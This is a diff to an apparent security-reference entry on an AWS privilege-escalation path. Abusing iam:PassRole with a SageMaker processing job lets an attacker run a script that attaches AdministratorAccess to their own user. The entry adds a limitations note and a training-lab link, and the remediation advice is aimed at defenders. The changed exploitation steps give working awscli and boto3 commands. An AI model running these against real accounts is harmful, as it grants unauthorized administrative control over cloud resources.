@@ -20,24 +20,29 @@ exploitationSteps:
   awscli:
   - step: 1
     command: |
-      echo '#!/bin/bash
-      aws iam create-access-key --user-name attacker
-      ' > process.sh && chmod +x process.sh
-    description: Create a malicious processing script that creates access keys for privilege escalation
+      echo '#!/usr/bin/env python3
+      import boto3
+      iam = boto3.client("iam")
+      iam.attach_user_policy(
+          UserName="YOUR_USERNAME",
+          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+      )
+      ' > exploit.py
+    description: Create a malicious processing script that attaches AdministratorAccess policy to your user
   - step: 2
     command: |
-      aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh
+      aws s3 cp exploit.py s3://BUCKET_NAME/scripts/exploit.py
     description: Upload the malicious script to S3
   - step: 3
     command: |
       aws sagemaker create-processing-job \
         --processing-job-name privesc-processing \
         --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
-        --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \
-        --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/processing/","LocalPath":"/opt/ml/processing/input","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
-        --processing-outputs '[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]' \
-        --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}
-    description: Create a processing job with the privileged role that executes the malicious script
+        --app-specification '{"ImageUri":"683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3","ContainerEntrypoint":["python3"],"ContainerArguments":["/opt/ml/processing/input/code/exploit.py"]}' \
+        --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/scripts/","LocalPath":"/opt/ml/processing/input/code","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
+        --processing-output-config '{"Outputs":[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output/","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]}' \
+        --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":10}}'
+    description: Create a processing job with the privileged role that executes the malicious Python script
   - step: 4
     command: aws sagemaker describe-processing-job --processing-job-name privesc-processing
     description: Monitor the processing job status and wait for execution
@@ -68,6 +73,10 @@ recommendation: |
   - Monitor and alert on SageMaker processing job creation with privileged roles
   - Regularly audit SageMaker processing jobs for excessive IAM permissions
   - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
+
 discoveredBy:
   name: Spencer Gietzen
   organization: Rhino Security Labs
@@ -105,6 +114,11 @@ learningEnvironments:
     githubLink: https://github.com/BishopFox/iam-vulnerable
     scenario: SageMaker-CreateProcessingJobPassRole
     description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: "privesc-one-hop/to-admin/iam-passrole+sagemaker-createprocessingjob"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
 permissions:
   required:
   - permission: iam:PassRole
